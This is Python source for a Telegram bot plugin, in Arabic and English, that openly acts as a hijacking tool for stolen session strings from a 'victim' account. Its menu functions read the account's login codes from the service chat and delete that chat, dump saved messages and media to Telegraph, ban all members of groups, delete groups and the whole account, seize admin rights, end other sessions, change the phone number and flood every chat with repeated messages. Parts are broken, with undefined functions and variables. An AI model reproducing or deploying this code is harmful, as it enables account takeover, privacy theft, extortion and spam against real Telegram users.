from PASH import bot, Alosma
#By Source Venus @xxx_Venus
from telethon import events, functions, types, Button
from datetime import timedelta
from PASH.utils import admin_cmd
import asyncio
from ..Config import Config
import os, asyncio, re
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

import random


from PIL import Image
from telegraph import Telegraph, exceptions, upload_file
from telethon.utils import get_display_name
bot = borg = tgbot

Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"


import os
from telegraph import Telegraph
from telethon.tl import types
async def savedmsgs(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            telegraph = Telegraph()
            telegraph.create_account(short_name="MyTelegraphAccount", author_name="Anonymous") 
            
            messages = []
            async for msg in X.iter_messages('me', reverse=True, limit=10):
                if msg.text:
                    messages.append(f"الرساله: {msg.text}")
                elif msg.media:
                    if isinstance(msg.media, types.MessageMediaPhoto):
                        downloaded_file_name = await X.download_media(msg.media.photo)
                        with open(downloaded_file_name, 'rb') as f:
                            photo_url = telegraph.upload_file(f)[0]['src']  
                        messages.append(f"صورة: https://telegra.ph{photo_url}")
                        os.remove(downloaded_file_name)  
                    elif isinstance(msg.media, types.MessageMediaDocument):
                        if hasattr(msg.media.document, 'mime_type') and 'audio' in msg.media.document.mime_type:
                            downloaded_file_name = await X.download_media(msg.media.document)
                            with open(downloaded_file_name, 'rb') as f:
                                voice_url = telegraph.upload_file(f)[0]['src']  
                            messages.append(f"بصمة: {voice_url}")
                            os.remove(downloaded_file_name)  
                        
            return "\n".join(messages)
        except Exception as e:
            print(e)
            return "An error occurred while fetching saved messages."
async def change_number(strses, number):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
        await X(rt())
        return True
    except Exception as rr:
        return rr

GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    try:
      await X.edit_2fa('xxx_Venus')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    await X(join(username))


async def leavegroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    i = ""
    
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await X.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "xxx_Venus"
menu = '''

"A" :~ [معرفه قنوات/كروبات التي يملكها]

"B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]

"C" :~ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]

"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]

"E" :~ [انضمام الى كروب/قناه عن طريق كود ترمكس] 

"F" :~ [مغادره كروب /قناه عن طريق كود ترمكس]

"G" :~][مسح كروب /قناه عن عن طريق كود ترمكس]

"H" :~ [تاكد من التحقق بخطوتين /مفعل او لا]

"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]

"J" :~ [حذف الحساب]

"K" :~ [حذف جميع المشرفين في كروب/قناه]

"L" ~ [ترقيه عضو الى مشرف داخل كروب/قناه]

"M" ~ [تغير رقم الحساب باستخدام كود ترمكس]

"V" ~ [جلب  الرسائل المحفوظه لدى الضحيه]

"Z" ~ [معليك بي ] 
'''
mm = '''
قم بلأنضمام الى قناة الفينوس @xxx_Venus
'''

keyboard = [
    [  
        Button.inline("A", data="A"), 
        Button.inline("B", data="B"),
        Button.inline("C", data="C"),
        Button.inline("D", data="D"),
        Button.inline("E", data="E")
    ],
    [
        Button.inline("F", data="F"), 
        Button.inline("G", data="G"),
        Button.inline("H", data="H"),
        Button.inline("I", data="I"),
        Button.inline("J", data="J")
    ],
    [
        Button.inline("K", data="K"), 
        Button.inline("L", data="L"),
        Button.inline("M", data="M"),
        Button.inline("N", data="N"),
        Button.inline("V", data="V"), # Added the V option to the menu
        Button.inline("Z", data="Z")
    ],
    [
        Button.url("سورس الفينوس🗿", "https://t.me/xxx_Venus")
    ]
]
if Config.TG_BOT_USERNAME is not None and tgbot is not None:
    @tgbot.on(events.InlineQuery)
    async def inline_handler(event):
        builder = event.builder
        result = None
        joker = Bot_Username.replace("@", "")
        query = event.text
        await bot.get_me()
        if query.startswith("هاك") and event.query.user_id == bot.uid:
            buttons = Button.url(" اضغط هنا عزيزي ", f"https://t.me/{joker}?start=hack")
            result = builder.article(
                title="Venus🗿",
                description="اضغط على الزر لعرض الأوامر.",
                text="**᯽︙ قم بالضغط على زر ادناه لأستخدام امر اختراق عبر كود التيرمكس",
                buttons=buttons
            )
        await event.answer([result] if result else None)
@bot.on(admin_cmd(outgoing=True, pattern="هاك"))
async def repo(event):
    if event.fwd_from:
        return
    ‏z1zzzzzzz1 = Config.TG_BOT_USERNAME
    if event.reply_to_msg_id:
        await event.get_reply_message()
    response = await bot.inline_query(‏z1zzzzzzz1, "هاك")
    await response[0].click(event.chat_id)
    await event.delete()
@tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  if event.sender_id == bot.uid:
      async with bot.conversation(event.chat_id) as x:
        keyboard = [
    [  
        Button.inline("A", data="A"), 
        Button.inline("B", data="B"),
        Button.inline("C", data="C"),
        Button.inline("D", data="D"),
        Button.inline("E", data="E")
    ],
    [
        Button.inline("F", data="F"), 
        Button.inline("G", data="G"),
        Button.inline("H", data="H"),
        Button.inline("I", data="I"),
        Button.inline("J", data="J")
    ],
    [
        Button.inline("K", data="K"), 
        Button.inline("L", data="L"),
        Button.inline("M", data="M"),
        Button.inline("N", data="N"),
        Button.inline("V", data="V"),
        Button.inline("Z", data="Z")
    ],
    [
        
        Button.url("المطور", "https://t.me/xxx_Venus")
    ]
]
        await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
    
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه\n /hack", buttons=keyboard)
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
      if len(i) > 1:
        file = open("session.txt", "w")
        file.write(i + "\n\nDetails BY @xxx_Venus")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nشكراً لأستخدامك سورس الفينوس ❤️. \n/hack", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("الان ارسل الكود تيرمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
    i = await userinfo(strses.text)
    await event.reply(i + "\n\nشكراً لأستخدامك سورس الفينوس ❤️.\n/hack", buttons=keyboard)
    
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("الان ارسل الكود تيرمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه", buttons=keyboard)
    await x.send_message("أرسل لي معرف/ايدي الكروب او القناة")
    grpid = await x.get_response()
    await userbans(strses.text, grpid.text)
    await event.reply("يتم حظر جميع اعضاء القناة/الكروب", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nشكرا لأستخدامك سورس الفينوس", buttons=keyboard)
    
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("الان ارسل الكود تيرمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
    await x.send_message("اعطني معرف/ايدي القناة او الكروب")
    grpid = await x.get_response()
    await joingroup(strses.text, grpid.text)
    await event.reply("تم الانضمام الى القناة او الكروب", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("الان ارسل الكود تيرمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
    await x.send_message("اعطيني معرف /ايدي الكروب او القناة")
    grpid = await x.get_response()
    await leavegroup(strses.text, grpid.text)
    await event.reply("لقد تم مغادرة القناة او الكروب,", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك الفينوس.", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      i = await user2fa(strses.text)
      if i:
        await event.reply("الشخص لم يفعل تحقق بخطوتين يمكنك الدخول الى الحساب بكل سهوله باستخدامك الامر ( D ) \n\nشكرا لك لاستخدامك البوت.", buttons=keyboard)
      else:
        await event.reply("للأسف الشخص مفعل التحقق بخطوتين", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      i = await terminate(strses.text)
      if i == True:
      	await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك الفينوس.", buttons=keyboard)
      else:
          await event.reply(f"حدث خطأ قم بتوجيه الرسالة للمطور @‏z1zzzzzzz1\n{i}")

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      i = await delacc(strses.text)
      await event.reply("تم حذف الحساب بنجاح 😈.", buttons=keyboard)

      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("ارسل لي معرف/ايدي القناة او الكروب")
      grp = await x.get_response()
      await x.send_message("الان ارسل لي المعرف")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("سأرفعك في القناة/الكروب 😉.", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("ارسل لي معرف/ايدي القناة او الكروب")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("تم حذف جميع مشرفين الكروب/القناة.", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه", buttons=keyboard)
      await x.send_message("اعطني رقم التي تريد تغير اليه\n[ملاحظه /لا تستخدم ارقام الوهميه]\n[اذا استخدمت الارقام الوهميه مراح تكدر تحصل الكود] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
        await asyncio.sleep(20)
        await x.send_message("الان ارسل لي الهاش")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("الان ارسل لي الكود")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond(" @‏z1zzzzzzz1 لقد تم تغير الرقم بنجاح ✅")
        else:
          await event.respond("هنالك خطأ ما حصل")
      except Exception as e:
        await event.respond(f"قم بتوجيه الرسالة في مجموعة المساعدة    \n str(e)")



@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
async def start(event):
    keyboard = [
      [  
        Button.inline("a", data="a"), 
        Button.inline("b", data="b"),
        Button.inline("c", data="c"),
        ],
      [
        Button.url("القناة", "https://t.me/xxx_Venus")
        ]
    ]
    await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)



async def gcasta(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for aman in X.iter_dialogs():
                chat = aman.id
                try:
                    await X.send_message(chat, tol, file=file)     
                    if lol != -1001551357238:
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                    elif chat == -1001606996743:
                        pass
                    await asyncio.sleep()
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)        


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل لي الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("الان ارسل لي الرسالة")
      msg = await x.get_response()
      await x.send_message("الان سيتم ارسال رسالة بشكل تلقائي كل 10 دقائق ")
      i = await gcasta(strses.text, msg.text)
      await event.reply(f"Done Gcasted In {i} all 😉😉.", buttons=keyboard)

molb = True

async def gcastb(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for sweetie in X.iter_dialogs():
                if sweetie.is_group:
                    chat = sweetie.id
                    try:
                        if chat != -1001606996743:
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            while molb != False:
                                await asyncio.sleep(600)
                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
                        elif chat == -1001606996743:
                            pass
                    except Exception as e:
                        print(e)
        except Exception as e:
            print(e)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("الان ارسل لي الرسالة")
      msg = await x.get_response()
      await x.send_message("الان سيتم ارسال الرسالة بشكل تلقائي كل 10 دقائق")
      i = await gcastb(strses.text, msg.text)
      await event.reply(f"Done Gcasted In {i} Group 😉😉.", buttons=keyboard)

async def gcastc(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for krishna in X.iter_dialogs():
                if krishna.is_user and not krishna.entity.bot:
                    chat = krishna.id
                    try:
                        await X.send_message(chat, tol, file=file)
                        while molc != False:
                            await asyncio.sleep(10)
                            await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=20))
                    except BaseException:
                        pass
        except Exception as e:
            print(e)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("الان ارسل لي الرساله")
      msg = await x.get_response()
      await x.send_message("الان سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
      i = await gcastc(strses.text, msg.text)
      await event.reply(f" محادثات خاصة {i} تم النشر في  😉😉.", buttons=keyboard)
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"V")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
        
        saved_messages = await savedmsgs(strses.text)

       
        message_parts = [saved_messages[i:i + 4096] for i in range(0, len(saved_messages), 4096)]

        
        for part in message_parts:
            await event.respond(part)

        await event.respond(" غير مبري الذمه اذا استخدمت الامر للابتزاز اللهم اني بلغت فاشهد", buttons=keyboard)





